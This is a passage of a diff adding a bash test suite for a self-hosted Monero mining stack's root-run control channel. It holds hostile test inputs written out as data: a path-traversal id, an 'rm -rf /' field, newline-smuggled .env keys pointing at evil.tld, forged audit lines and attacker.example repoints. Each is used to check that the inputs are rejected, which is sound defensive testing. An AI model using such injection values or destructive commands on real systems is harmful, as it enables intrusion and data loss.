+    dashboard:{secure:true,host:"box.lan",auth:{username:"admin",password:"a control passphrase"},control:{enabled:true}}}}' >"$REQS/$UUID1.json"
+out="$(run_pending)"
+assert_rc "runner exits 0 on a valid preview" "$?" "0"
+[ ! -f "$REQS/$UUID1.json" ] && ok "request claimed out of requests/" || bad "request claimed out of requests/" "still present"
+assert_eq "preview result status" "$(jq -r '.status' "$RESULTS/$UUID1.json" 2>/dev/null)" "previewed"
+assert_contains "preview result carries the change row" "$(jq -r '.changes[].msg' "$RESULTS/$UUID1.json" 2>/dev/null)" "P2Pool sidechain changing"
+assert_eq "pool switch alone is not destructive" "$(jq -r '.destructive' "$RESULTS/$UUID1.json" 2>/dev/null)" "false"
+[ -f "$STAGED/$UUID1.json" ] && ok "candidate staged host-side" || bad "candidate staged host-side" "missing"
+# The staged copy carries merged secrets — it must land owner-only (#33 re-review).
+assert_eq "staged candidate is mode 600" "$(file_mode "$STAGED/$UUID1.json")" "600"
+assert_contains "preview audited" "$(cat "$AUDIT" 2>/dev/null)" "\"action\":\"preview\",\"status\":\"previewed\""
+
+# Malformed id: it would become a filename, so the request is discarded with no result at all.
+printf '{"id":"../../etc/passwd","action":"preview","actor":"x","config":{}}\n' >"$REQS/evil.json"
+out="$(run_pending)"
+assert_rc "runner exits 0 on a malformed id" "$?" "0"
+assert_contains "malformed id is called out" "$out" "malformed id"
+assert_eq "no result file for a malformed id" "$(ls "$RESULTS" | wc -l | tr -d ' ')" "1"
+
+# Well-formed but non-v4 id (version nibble 1): the loose old regex accepted any hex uuid shape;
+# the tightened gate (#438) pins version 4 + RFC variant, so this must be discarded too.
+printf '{"id":"11111111-1111-1111-1111-111111111111","action":"preview","actor":"x","config":{}}\n' >"$REQS/nonv4.json"
+out="$(run_pending)"
+assert_contains "non-v4 uuid id is discarded" "$out" "malformed id"
+[ ! -f "$RESULTS/11111111-1111-1111-1111-111111111111.json" ] &&
+    ok "no result file for a non-v4 id" || bad "no result file for a non-v4 id" "result written"
+
+# Unknown action / extra keys / invalid candidate config → rejected results, nothing staged.
+printf '{"id":"%s","action":"exec","actor":"x"}\n' "$UUID2" >"$REQS/$UUID2.json"
+run_pending >/dev/null
+assert_eq "unknown action is rejected" "$(jq -r '.status' "$RESULTS/$UUID2.json" 2>/dev/null)" "rejected"
+# A malicious action string on the unknown-action path cannot forge a second line into the
+# tamper-evidence audit log: the field is charset-stripped at the write chokepoint. Feed an action
+# carrying a newline + a fake JSON entry, then assert every audit line is still valid JSON and no
+# forged status leaked in (#349 review).
+audit_before=$(wc -l <"$AUDIT" 2>/dev/null || echo 0)
+# jq decodes the \n and quotes into REAL characters in the action value, so the host-side
+# jq -r '.action' hands control_audit a string with an embedded newline + fake JSON object —
+# the exact shape that would append a forged line without the charset strip.
+jq -nc --arg id "$UUID2" '{id:$id,actor:"x",action:"evil\n{\"ts\":\"0\",\"forged\":\"yes\"}"}' >"$REQS/$UUID2.json"
+run_pending >/dev/null
+audit_after=$(wc -l <"$AUDIT" 2>/dev/null || echo 0)
+assert_eq "forged-action intent adds exactly one audit line" "$((audit_after - audit_before))" "1"
+while IFS= read -r line; do printf '%s' "$line" | jq -e . >/dev/null 2>&1 || bad "every audit line is valid JSON" "unparseable: $line"; done <"$AUDIT"
+ok "every audit line is valid JSON after a forged-action intent"
+assert_not_contains "no forged audit entry leaked in" "$(cat "$AUDIT")" '"forged":"yes"'
+printf '{"id":"%s","action":"preview","actor":"x","config":{},"cmd":"rm -rf /"}\n' "$UUID2" >"$REQS/$UUID2.json"
+run_pending >/dev/null
+assert_contains "extra request keys are rejected" "$(jq -r '.error' "$RESULTS/$UUID2.json" 2>/dev/null)" "unexpected keys"
+jq -n --arg w "$WALLET" --arg id "$UUID2" '{id:$id, action:"preview", actor:"x", config:{
+    monero:{mode:"local",wallet_address:$w}, tari:{wallet_address:"T"}, p2pool:{pool:"banana"},
+    dashboard:{auth:{password:"a control passphrase"},control:{enabled:true}}}}' >"$REQS/$UUID2.json"
+run_pending >/dev/null
+assert_eq "invalid candidate config is rejected" "$(jq -r '.status' "$RESULTS/$UUID2.json" 2>/dev/null)" "rejected"
+assert_contains "rejection carries pithead's validation error" "$(jq -r '.error' "$RESULTS/$UUID2.json" 2>/dev/null)" "p2pool.pool"
+[ ! -f "$STAGED/$UUID2.json" ] && ok "rejected candidate is not left staged" || bad "rejected candidate is not left staged" "staged file present"
+
+# Commit without a staged intent → rejected (preview first).
+printf '{"id":"%s","action":"commit","actor":"admin"}\n' "$UUID2" >"$REQS/$UUID2.json"
+run_pending >/dev/null
+assert_contains "commit without a staged intent is rejected" "$(jq -r '.error' "$RESULTS/$UUID2.json" 2>/dev/null)" "preview first"
+
+# Commit of the previewed intent: backup written, apply -y ran, audit line, result applied.
+: >"$CTRL_LOG"
+printf '{"id":"%s","action":"commit","actor":"admin"}\n' "$UUID1" >"$REQS/$UUID1.json"
+run_pending >/dev/null
+assert_eq "commit result status" "$(jq -r '.status' "$RESULTS/$UUID1.json" 2>/dev/null)" "applied"
+assert_eq "committed config landed in config.json" "$(jq -r '.p2pool.pool' "$C/config.json")" "mini"
+[ -f "$C/config.json.bak-control" ] &&
+    assert_eq "pre-change backup kept" "$(jq -r '.p2pool.pool' "$C/config.json.bak-control")" "main" ||
+    bad "pre-change backup kept" "config.json.bak-control missing"
+assert_contains "commit ran the real apply (containers recreated)" "$(cat "$CTRL_LOG")" "compose up"
+assert_contains "commit audited with the actor" "$(cat "$AUDIT")" "\"actor\":\"admin\",\"action\":\"commit\",\"status\":\"applied\""
+[ ! -f "$STAGED/$UUID1.json" ] && ok "staged intent consumed on commit" || bad "staged intent consumed on commit" "still staged"
+
+echo "== black-box: audit log records names, never values (#349) =="
+# WHAT changed rides in the audit entry as env-key NAMES (main -> mini touches the p2pool keys);
+# no config or secret VALUE may ever land in the log — it is mounted into the dashboard container.
+assert_contains "commit audit records the changed key names" "$(cat "$AUDIT")" '"keys":"P2POOL'
+assert_contains "preview audit records the changed key names" "$(grep '"status":"previewed"' "$AUDIT" | tail -n 1)" '"keys":"P2POOL'
+case "$(cat "$AUDIT")" in
+*"a control passphrase"* | *"$WALLET"* | *mini*) bad "audit log holds no config or secret values" "a value leaked into audit/control.log" ;;
+*) ok "audit log holds no config or secret values" ;;
+esac
+
+# Expired staged intent (older than the 10-min commit window) → rejected as expired and cleared.
+# Age it ~15 min: past the 10-min expiry the commit enforces, but INSIDE the 60-min stale sweep so
+# the sweep leaves it for control_commit to judge (a 2020 date would be swept first, #33 hardening).
+jq -n --arg id "$UUID2" '{}' >"$STAGED/$UUID2.json"
+touch -t "$(date -d '15 minutes ago' +%Y%m%d%H%M 2>/dev/null || date -v-15M +%Y%m%d%H%M)" "$STAGED/$UUID2.json"
+printf '{"id":"%s","action":"commit","actor":"admin"}\n' "$UUID2" >"$REQS/$UUID2.json"
+run_pending >/dev/null
+assert_contains "expired staged intent is rejected" "$(jq -r '.error' "$RESULTS/$UUID2.json" 2>/dev/null)" "expired"
+[ ! -f "$STAGED/$UUID2.json" ] && ok "expired staged intent cleared" || bad "expired staged intent cleared" "still staged"
+
+echo "== black-box: .env line-injection guard (#33 hardening, per field) =="
+# A newline in any config string that renders into .env unquoted would inject a SECOND KEY=value
+# line — e.g. PITHEAD_REGISTRY=evil.tld — which the root apply then trusts for every image: pull
+# (RCE). parse_and_validate_config (the chokepoint both preview dry-run and real commit run) must
+# reject a control character in EVERY string leaf. Build a full valid config, then poison one field.
+inject_reject() { # <label> <jq-setter expr using $v>
+    jq -n --arg w "$WALLET" --arg v $'legit\nPITHEAD_REGISTRY=evil.tld/attacker' \
+        '{monero:{mode:"local",wallet_address:$w,node_username:"u",node_password:"p"},
+          tari:{wallet_address:"T"}, p2pool:{pool:"main"},
+          dashboard:{secure:true,host:"box.lan",auth:{username:"admin",password:"a control passphrase"},control:{enabled:true}}}
+         | '"$2" >"$C/config.json"
+    out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply --dry-run --porcelain 2>&1)"
+    rc=$?
+    assert_rc "$1 with a newline is rejected by parse_and_validate_config" "$rc" "1"
+    assert_contains "$1 rejection names the control-char guard" "$out" "control character"
+}
+inject_reject "node_password" '.monero.node_password=$v'
+inject_reject "node_username" '.monero.node_username=$v'
+inject_reject "bot_token" '(.telegram={bot_token:$v})'
+inject_reject "api_token" '(.workers={api_token:$v})'
+inject_reject "ping_url" '(.healthchecks={ping_url:$v})'
+inject_reject "chat_id" '(.telegram={chat_id:$v})'
+# Positive: legitimate tokens (no control chars) still validate.
+jq -n --arg w "$WALLET" \
+    '{monero:{mode:"local",wallet_address:$w,node_username:"u",node_password:"p"},
+      tari:{wallet_address:"T"}, p2pool:{pool:"main"},
+      telegram:{bot_token:"123456:legit-ABC_def"}, workers:{api_token:"tok_legit123"},
+      healthchecks:{ping_url:"https://hc-ping.com/abc-123"},
+      dashboard:{secure:true,host:"box.lan",auth:{username:"admin",password:"a control passphrase"},control:{enabled:true}}}' >"$C/config.json"
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply --dry-run --porcelain 2>&1)"
+assert_rc "legitimate secrets still validate" "$?" "0"
+# No second line reaches .env: a poisoned config rejected at `apply -y` never renders the attacker key.
+jq -n --arg w "$WALLET" --arg v $'legit\nPITHEAD_REGISTRY=evil.tld/attacker' \
+    '{monero:{mode:"local",wallet_address:$w,node_username:"u",node_password:"p"},
+      tari:{wallet_address:"T"}, p2pool:{pool:"main"}, telegram:{bot_token:$v},
+      dashboard:{secure:true,host:"box.lan",auth:{username:"admin",password:"a control passphrase"},control:{enabled:true}}}' >"$C/config.json"
+(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply -y >/dev/null 2>&1)
+if grep -q 'PITHEAD_REGISTRY' "$C/.env"; then bad "no injected line in .env" "PITHEAD_REGISTRY landed in .env"; else ok "rejected config injects no second .env line"; fi
+
+echo "== black-box: control channel on a published onion requires client-auth (#33 hardening) =="
+# A root-capable, funds-redirecting mutation channel must not sit behind only a brute-forceable
+# password on an anonymously-reachable onion. control+onion+client_auth=false → refused.
+onion_control_config() { # <onion-enabled> <client-auth> -> writes config.json
+    jq -n --arg w "$WALLET" --argjson onion "$1" --argjson ca "$2" \
+        '{monero:{mode:"local",wallet_address:$w,node_username:"u",node_password:"p"},
+          tari:{wallet_address:"T"}, p2pool:{pool:"main"},
+          dashboard:{secure:true,host:"box.lan",auth:{username:"admin",password:"a strong control passphrase"},
+                     onion:{enabled:$onion,client_auth:$ca}, control:{enabled:true}}}' >"$C/config.json"
+}
+onion_control_config true false
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply --dry-run --porcelain 2>&1)"
+assert_rc "control+onion without client_auth is refused" "$?" "1"
+assert_contains "refusal names client_auth" "$out" "client_auth"
+onion_control_config true true
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply --dry-run --porcelain 2>&1)"
+assert_rc "control+onion WITH client_auth validates" "$?" "0"
+assert_not_contains "allowed combo raises no client_auth error" "$out" "client_auth"
+# control without an onion (LAN) stays allowed — client-auth only gates the published onion.
+control_config main
+out="$(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply --dry-run --porcelain 2>&1)"
+assert_rc "control without an onion is allowed" "$?" "0"
+
+echo "== black-box: approval gate fails closed on a destructive commit (#33 / #338) =="
+UUID3="33333333-3333-4333-8333-333333333333"
+# Clean baseline: pool mini, clearnet off, applied.
+control_config mini
+(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply -y >/dev/null 2>&1)
+# Candidate turns on Monero clearnet initial sync — describe_change flags this DEST (destructive).
+jq -n --arg w "$WALLET" --arg id "$UUID3" '{id:$id,action:"preview",actor:"admin",config:{
+    monero:{mode:"local",wallet_address:$w,node_username:"u",node_password:"p",clearnet_initial_sync:true},
+    tari:{wallet_address:"T"}, p2pool:{pool:"mini"},
+    dashboard:{secure:true,host:"box.lan",auth:{username:"admin",password:"a control passphrase"},control:{enabled:true}}}}' >"$REQS/$UUID3.json"
+run_pending >/dev/null
+assert_eq "destructive candidate previews destructive:true" "$(jq -r '.destructive' "$RESULTS/$UUID3.json" 2>/dev/null)" "true"
+printf '{"id":"%s","action":"commit","actor":"admin"}\n' "$UUID3" >"$REQS/$UUID3.json"
+run_pending >/dev/null
+assert_eq "destructive commit is refused" "$(jq -r '.status' "$RESULTS/$UUID3.json" 2>/dev/null)" "rejected"
+assert_contains "destructive refusal points at #338" "$(jq -r '.error' "$RESULTS/$UUID3.json" 2>/dev/null)" "#338"
+assert_eq "refused destructive commit did not touch config.json" "$(jq -r '.monero.clearnet_initial_sync // false' "$C/config.json")" "false"
+[ ! -f "$STAGED/$UUID3.json" ] && ok "refused destructive intent cleared from staged" || bad "refused destructive intent cleared from staged" "still staged"
+# A NON-destructive commit still proceeds (pool switch mini -> nano is INFO, not DEST).
+jq -n --arg w "$WALLET" --arg id "$UUID3" '{id:$id,action:"preview",actor:"admin",config:{
+    monero:{mode:"local",wallet_address:$w,node_username:"u",node_password:"p"},
+    tari:{wallet_address:"T"}, p2pool:{pool:"nano"},
+    dashboard:{secure:true,host:"box.lan",auth:{username:"admin",password:"a control passphrase"},control:{enabled:true}}}}' >"$REQS/$UUID3.json"
+run_pending >/dev/null
+printf '{"id":"%s","action":"commit","actor":"admin"}\n' "$UUID3" >"$REQS/$UUID3.json"
+run_pending >/dev/null
+assert_eq "non-destructive commit still applies through the gate" "$(jq -r '.status' "$RESULTS/$UUID3.json" 2>/dev/null)" "applied"
+assert_eq "non-destructive change landed in config.json" "$(jq -r '.p2pool.pool' "$C/config.json")" "nano"
+
+echo "== black-box: approval gate default-denies security-control changes (#33 re-review) =="
+# describe_change flags only the ENABLE/CHANGE direction of security controls as DEST — disabling
+# dashboard auth, downgrading onion client-auth, clearing the stratum password or repointing the
+# Telegram bot are all INFO rows. The gate must refuse those on the explicit sensitive-key set,
+# independent of the DEST flag; a non-security change must still pass.
+UUID5="55555555-5555-4555-8555-555555555555"
+# Baseline: nano pool + stratum password + telegram bot + control, applied from the host CLI.
+jq -n --arg w "$WALLET" \
+    '{monero:{mode:"local",wallet_address:$w,node_username:"u",node_password:"p"},
+    tari:{wallet_address:"T"}, p2pool:{pool:"nano",stratum_password:"s3cretpw"},
+    telegram:{enabled:true,bot_token:"123456:legit-ABC_def",chat_id:"1111"},
+    dashboard:{secure:true,host:"box.lan",auth:{username:"admin",password:"a control passphrase"},
+               control:{enabled:true}}}' >"$C/config.json"
+(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply -y >/dev/null 2>&1)
+gate_try() { # <candidate-json-file> — preview then commit via the spool; result lands in $RESULTS/$UUID5.json
+    jq --arg id "$UUID5" '{id:$id,action:"preview",actor:"admin",config:.}' "$1" >"$REQS/$UUID5.json"
+    run_pending >/dev/null
+    printf '{"id":"%s","action":"commit","actor":"admin"}\n' "$UUID5" >"$REQS/$UUID5.json"
+    run_pending >/dev/null
+}
+
+# Disable the dashboard login (auth.password:"" needs control:false to pass validation): the
+# preview flags destructive:false — proof the DEST path alone would wave it through — and the
+# commit must still be refused, config untouched.
+jq '.dashboard.auth={username:"admin"} | .dashboard.control={enabled:false}' "$C/config.json" >"$C/cand.json"
+jq --arg id "$UUID5" '{id:$id,action:"preview",actor:"admin",config:.}' "$C/cand.json" >"$REQS/$UUID5.json"
+run_pending >/dev/null
+assert_eq "auth-disable previews destructive:false (DEST alone would allow it)" \
+    "$(jq -r '.destructive' "$RESULTS/$UUID5.json" 2>/dev/null)" "false"
+printf '{"id":"%s","action":"commit","actor":"admin"}\n' "$UUID5" >"$REQS/$UUID5.json"
+run_pending >/dev/null
+assert_eq "dashboard-login disable commit is refused" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "rejected"
+assert_contains "auth-disable refusal names the sensitive-key gate" "$(jq -r '.error' "$RESULTS/$UUID5.json" 2>/dev/null)" "security-sensitive"
+assert_eq "config.json keeps the dashboard password" "$(jq -r '.dashboard.auth.password' "$C/config.json")" "a control passphrase"
+assert_eq "config.json keeps control enabled" "$(jq -r '.dashboard.control.enabled' "$C/config.json")" "true"
+
+# Clear the stratum access password (disable direction is an INFO row) — refused.
+jq 'del(.p2pool.stratum_password)' "$C/config.json" >"$C/cand.json"
+gate_try "$C/cand.json"
+assert_eq "stratum-password disable commit is refused" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "rejected"
+assert_eq "config.json keeps the stratum password" "$(jq -r '.p2pool.stratum_password' "$C/config.json")" "s3cretpw"
+
+# Repoint the Telegram bot (token change is an INFO row; the bot is the future #338 approval
+# channel, so an attacker must not swap it) — refused.
+jq '.telegram.bot_token="654321:evil-XYZ_abc"' "$C/config.json" >"$C/cand.json"
+gate_try "$C/cand.json"
+assert_eq "telegram bot_token repoint commit is refused" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "rejected"
+assert_eq "config.json keeps the original bot token" "$(jq -r '.telegram.bot_token' "$C/config.json")" "123456:legit-ABC_def"
+
+# Downgrade the onion to password-only (client_auth:false is an INFO row in every direction).
+# Baseline first: onion on + client_auth on (the only combo valid with control on), applied.
+jq '.dashboard.onion={enabled:true,client_auth:true}' "$C/config.json" >"$C/cand.json" && mv "$C/cand.json" "$C/config.json"
+(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply -y >/dev/null 2>&1)
+assert_contains "onion baseline applied (client_auth on)" "$(cat "$C/.env")" "DASHBOARD_ONION_CLIENT_AUTH=true"
+jq '.dashboard.onion.client_auth=false | .dashboard.control.enabled=false' "$C/config.json" >"$C/cand.json"
+gate_try "$C/cand.json"
+assert_eq "onion client-auth downgrade commit is refused" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "rejected"
+assert_eq "config.json keeps onion client-auth on" "$(jq -r '.dashboard.onion.client_auth' "$C/config.json")" "true"
+
+# TRUE default-deny (#33 re-review round 2): the gate is an ALLOWLIST of editable keys, not a
+# blocklist of sensitive ones, so a key nobody thought to enumerate still refuses. Each candidate
+# below was committable under the blocklist gate — these assertions are the teeth.
+# p2pool clearnet flip: dials sidechain peers over clearnet, deanonymizing the host IP, no
+# auto-revert.
+jq '.p2pool.clearnet=true' "$C/config.json" >"$C/cand.json"
+gate_try "$C/cand.json"
+assert_eq "p2pool clearnet flip commit is refused" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "rejected"
+assert_eq "config.json keeps p2pool on Tor" "$(jq -r '.p2pool.clearnet // false' "$C/config.json")" "false"
+# XvB stats over clearnet: correlates the host IP with the payout wallet.
+jq '.xvb.tor=false' "$C/config.json" >"$C/cand.json"
+gate_try "$C/cand.json"
+assert_eq "xvb tor-disable commit is refused" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "rejected"
+assert_eq "config.json keeps xvb on Tor" "$(jq -r '.xvb.tor // true' "$C/config.json")" "true"
+# Healthchecks ping-URL repoint: exfiltrates liveness / silences the dead-man's switch.
+jq '.healthchecks={ping_url:"https://attacker.example/ping"}' "$C/config.json" >"$C/cand.json"
+gate_try "$C/cand.json"
+assert_eq "healthchecks ping-url repoint commit is refused" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "rejected"
+assert_eq "config.json keeps healthchecks unset" "$(jq -r '.healthchecks.ping_url // "unset"' "$C/config.json")" "unset"
+# XvB pool-URL repoint: redirects donated hashrate to an attacker's pool.
+jq '.xvb.url="attacker.example:4247"' "$C/config.json" >"$C/cand.json"
+gate_try "$C/cand.json"
+assert_eq "xvb pool-url repoint commit is refused" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "rejected"
+assert_eq "config.json keeps the default xvb url" "$(jq -r '.xvb.url // "unset"' "$C/config.json")" "unset"
+# The tamper-evidence alert toggles stay host-only even though sibling event toggles are
+# editable: silencing WALLET_CHANGED would blind the future #338 approval channel.
+jq '.telegram.events={wallet_changed:false}' "$C/config.json" >"$C/cand.json"
+gate_try "$C/cand.json"
+assert_eq "wallet-changed alert silencing is refused" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "rejected"
+# An allowlisted operational toggle on the same baseline still commits.
+jq '.telegram.events={node_down:false}' "$C/config.json" >"$C/cand.json"
+gate_try "$C/cand.json"
+assert_eq "allowlisted alert toggle still applies" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "applied"
+assert_eq "alert toggle landed in config.json" "$(jq -r '.telegram.events.node_down' "$C/config.json")" "false"
+
+# Forged-flag bypass: the container tampers its visible copy of the preview result to
+# destructive:false AND sends a commit request carrying its own destructive:false field. The
+# extra request key is rejected outright; a clean follow-up commit is still refused because the
+# gate re-derives the change set host-side from the STAGED config — it never reads either flag.
+jq '.telegram.bot_token="999999:forged-token"' "$C/config.json" >"$C/cand.json"
+jq --arg id "$UUID5" '{id:$id,action:"preview",actor:"admin",config:.}' "$C/cand.json" >"$REQS/$UUID5.json"
+run_pending >/dev/null
+printf '{"status":"previewed","changes":[],"destructive":false,"ts":0}\n' >"$RESULTS/$UUID5.json"
+printf '{"id":"%s","action":"commit","actor":"admin","destructive":false}\n' "$UUID5" >"$REQS/$UUID5.json"
+run_pending >/dev/null
+assert_contains "commit request smuggling a destructive flag is rejected" "$(jq -r '.error' "$RESULTS/$UUID5.json" 2>/dev/null)" "unexpected keys"
+printf '{"id":"%s","action":"commit","actor":"admin"}\n' "$UUID5" >"$REQS/$UUID5.json"
+run_pending >/dev/null
+assert_eq "commit after result-file tampering is still refused" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "rejected"
+assert_contains "tampered-flag refusal comes from the host-side re-derivation" "$(jq -r '.error' "$RESULTS/$UUID5.json" 2>/dev/null)" "security-sensitive"
+assert_eq "config.json keeps the untampered bot token" "$(jq -r '.telegram.bot_token' "$C/config.json")" "123456:legit-ABC_def"
+
+# Sensitive keys PRESENT but UNCHANGED must not trip the gate: a plain pool-tier change on the
+# same baseline (auth + onion + stratum password + telegram all set) still applies.
+jq '.p2pool.pool="mini"' "$C/config.json" >"$C/cand.json"
+gate_try "$C/cand.json"
+assert_eq "non-security change on a security-laden config still applies" "$(jq -r '.status' "$RESULTS/$UUID5.json" 2>/dev/null)" "applied"
+assert_eq "pool tier change landed in config.json" "$(jq -r '.p2pool.pool' "$C/config.json")" "mini"
+
+echo "== black-box: audit log growth is bounded (#349) =="
+# Seed the log past the 512 KiB cap, then let the runner audit one more event: the writer trims
+# to the newest 2000 lines BEFORE appending, so the file shrinks instead of growing forever and
+# the fresh entry is always the last line.
+for _ in $(seq 1 6000); do
+    printf '{"ts":"old","id":"","actor":"filler","action":"preview","status":"previewed","keys":""}\n'
+done >>"$AUDIT"
+[ "$(wc -c <"$AUDIT" | tr -d ' ')" -gt 524288 ] || bad "audit log seeded past the cap" "seed too small"
+printf '{"id":"%s","action":"commit","actor":"admin"}\n' "$UUID5" >"$REQS/$UUID5.json" # no staged intent -> rejected, still audited
+run_pending >/dev/null
+audit_size="$(wc -c <"$AUDIT" | tr -d ' ')"
+if [ "$audit_size" -lt 300000 ]; then
+    ok "audit log trimmed back under the cap ($audit_size bytes)"
+else
+    bad "audit log trimmed back under the cap" "$audit_size bytes"
+fi
+assert_eq "trim keeps the newest entries (fresh entry is the last line)" "$(tail -n 1 "$AUDIT" | jq -r '.action')" "commit"
+
+echo "== black-box: spool intake cap + symlink refusal + stale sweep (#33 hardening) =="
+UUID4="44444444-4444-4444-8444-444444444444"
+# Oversized intent: refused BEFORE jq parses it (bounded root-runner DoS), no result addressed.
+: >"$AUDIT"
+{
+    printf '{"id":"%s","action":"preview","pad":"' "$UUID4"
+    head -c 70000 /dev/zero | tr '\0' a
+    printf '"}\n'
+} >"$REQS/$UUID4.json"
+run_pending >/dev/null
+assert_contains "oversized intent refused before parsing" "$(cat "$AUDIT" 2>/dev/null)" "refused-oversize"
+[ ! -f "$RESULTS/$UUID4.json" ] && ok "oversized intent gets no result file" || bad "oversized intent gets no result file" "result written"
+[ ! -f "$REQS/$UUID4.json" ] && ok "oversized intent claimed out of requests/" || bad "oversized intent claimed out of requests/" "still present"
+# Symlinked request: a symlink dropped in requests/ could point the root runner at any host file —
+# refused, never followed (graft #437).
+: >"$AUDIT"
+ln -s "$C/config.json" "$REQS/$UUID4.json"
+run_pending >/dev/null
+assert_contains "symlinked request refused" "$(cat "$AUDIT" 2>/dev/null)" "refused-nonregular"
+[ ! -f "$RESULTS/$UUID4.json" ] && ok "symlinked request gets no result" || bad "symlinked request gets no result" "result written"
+rm -f "$REQS/$UUID4.json"
+# Stale sweep: staged/ + requests/ files older than an hour are removed at run start.
+jq -n '{}' >"$STAGED/stale.json"
+touch -t 202001010000 "$STAGED/stale.json"
+printf '{}' >"$REQS/stale-req.json"
+touch -t 202001010000 "$REQS/stale-req.json"
+run_pending >/dev/null
+[ ! -f "$STAGED/stale.json" ] && ok "aged staged file swept" || bad "aged staged file swept" "still present"
+[ ! -f "$REQS/stale-req.json" ] && ok "aged request file swept" || bad "aged request file swept" "still present"
+# Per-run intake cap: 60 pending intents → one run claims exactly 50 and LEAVES the remainder in
+# requests/ for the next path-unit fire (deterministic overflow — nothing is dropped). Invalid
+# JSON bodies keep each of the 60 on the cheap discard path; they still count against the cap.
+for i in $(seq 1 60); do printf 'notjson' >"$REQS/cap-$i.json"; done
+out="$(run_pending)"
+assert_contains "per-run cap announced after 50 intents" "$out" "per-run cap"
+assert_contains "exactly 50 intents processed in one run" "$out" "Processed 50 control request(s)"
+assert_eq "overflow intents left for the next run" "$(ls "$REQS" | wc -l | tr -d ' ')" "10"
+out="$(run_pending)"
+assert_contains "next run drains the remainder" "$out" "Processed 10 control request(s)"
+assert_eq "spool empty after the second run" "$(ls "$REQS" | wc -l | tr -d ' ')" "0"
+
+echo "== black-box: control upgrade verb (#59) =="
+# A RELEASE install (no build/*/Dockerfile → is_source_checkout false) with the control channel
+# on. The runner's upgrade verb runs against a stub curl (GitHub release API + bundle download)
+# and a fake release bundle whose pithead records what it was asked to do — no network, no docker.
+UPG="$SANDBOX/upgrade59"
+UPGREQS="$UPG/data/control/requests"
+UPGRESULTS="$UPG/data/control/results"
+UPGAUDIT="$UPG/data/control/audit/control.log"
+mkdir -p "$UPGREQS" "$UPG/data/control/staged" "$UPGRESULTS" "$UPG/data/control/audit"
+cp "$STACK" "$UPG/pithead"
+make_stubs "$UPG/bin"
+printf '1.3.1' >"$UPG/VERSION"
+# The stub curl serves the canned API response for the release-API URL and copies the fake bundle
+# for the download URL; every call is logged so the tests can assert what was (not) dialled.
+cat >"$UPG/bin/curl" <<'EOF'
+#!/usr/bin/env bash
+echo "[curl] $*" >>"${CURL_LOG:-/dev/null}"
+[ "${CURL_FAIL:-}" = "1" ] && exit 22
+url="${*: -1}"
+out=""
+prev=""
+for a in "$@"; do
+    [ "$prev" = "-o" ] && out="$a"
+    prev="$a"
+done
+case "$url" in
+*api.github.com*) cat "${CURL_API_RESPONSE:?}" ;;
+*releases/download/*.sig) cp "${CURL_SIG:?}" "$out" ;;
+*releases/download/*) cp "${CURL_BUNDLE:?}" "$out" ;;
+*) exit 22 ;;
+esac
+EOF
+chmod +x "$UPG/bin/curl"
+# The fake v9.9.9 release bundle: a pithead that logs its invocation (and can be told to fail).
+UPGB="$SANDBOX/upgrade59-bundle"
+mkdir -p "$UPGB/pithead"
+cat >"$UPGB/pithead/pithead" <<'EOF'
+#!/usr/bin/env bash
+echo "new-pithead $*" >>upgrade-invocations.log
+[ "${NEW_PITHEAD_FAIL:-}" = "1" ] && exit 1
+exit 0
+EOF
+chmod +x "$UPGB/pithead/pithead"
+printf '9.9.9' >"$UPGB/pithead/VERSION"
+tar -czf "$UPGB/bundle.tar.gz" -C "$UPGB" pithead
+printf '{"tag_name":"v9.9.9","html_url":"https://example.invalid/rel"}' >"$UPGB/api.json"
+seed_upgrade_env() { # <control-enabled true|false>
+    cat >"$UPG/.env" <<EOF
+DEPLOYMENT_COMPLETED=true
+DASHBOARD_CONTROL_ENABLED=$1
+CONTROL_DIR=$UPG/data/control
+NETWORK_PREFIX=10.9.0
+EOF
+}
+urun() {
+    (cd "$UPG" && PATH="$UPG/bin:$PATH" CURL_LOG="$UPG/curl.log" \
+        CURL_API_RESPONSE="$UPGB/api.json" CURL_BUNDLE="$UPGB/bundle.tar.gz" \
+        ./pithead control-run-pending 2>&1)
+}
+upgrade_intent() { # <id> [version] — drop an upgrade request into the spool
+    if [ "$#" -ge 2 ]; then
+        printf '{"id":"%s","action":"upgrade","actor":"admin","version":"%s"}\n' "$1" "$2" >"$UPGREQS/$1.json"
+    else
+        printf '{"id":"%s","action":"upgrade","actor":"admin"}\n' "$1" >"$UPGREQS/$1.json"
+    fi
+}
+UUPG="66666666-6666-4666-8666-666666666666"
+reset_upgrade_state() { # restore between attempts: fresh runner copy, running version, no throttle
+    cp "$STACK" "$UPG/pithead"
+    printf '1.3.1' >"$UPG/VERSION"
+    rm -f "$UPG/data/control/staged/.upgrade-stamp" "$UPGRESULTS/$UUPG.json" "$UPG/upgrade-invocations.log"
+    : >"$UPG/curl.log"
+}
+
+# Source checkout ($C): the upgrade verb is refused outright — its update path is `git pull`.
+printf '{"id":"%s","action":"upgrade","actor":"admin","version":"v9.9.9"}\n' "$UUPG" >"$REQS/$UUPG.json"
+run_pending >/dev/null
